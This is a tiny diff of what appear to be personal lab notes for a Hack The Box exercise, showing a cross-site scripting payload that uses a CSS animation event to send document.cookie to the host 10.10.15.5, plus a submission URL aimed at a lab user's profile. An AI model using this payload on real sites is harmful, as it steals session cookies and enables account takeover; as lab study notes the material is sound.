@@ -4,7 +4,6 @@ ___
 <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.5/index.php?c=' + document.cookie;"></video>
 ```
 
-
 http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=ela.stienen@example.com
 
 ![[Pasted image 20241012120106.png]]
